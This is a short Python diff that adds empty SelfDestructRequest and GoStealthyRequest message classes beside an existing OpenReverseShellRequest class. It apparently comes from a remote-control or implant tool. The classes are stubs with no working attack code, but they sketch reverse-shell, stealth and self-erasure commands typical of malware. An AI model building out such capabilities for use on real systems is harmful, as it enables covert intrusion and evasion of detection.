@@ -86,3 +86,13 @@ class OpenReverseShellRequest(Request):
     def __init__(self, port: int, **kwargs):
         super().__init__(**kwargs)
         self.port = port
+
+
+class SelfDestructRequest(Request):
+    def __init__(self, **kwargs):
+        super().__init__(**kwargs)
+
+
+class GoStealthyRequest(Request):
+    def __init__(self, **kwargs):
+        super().__init__(**kwargs)
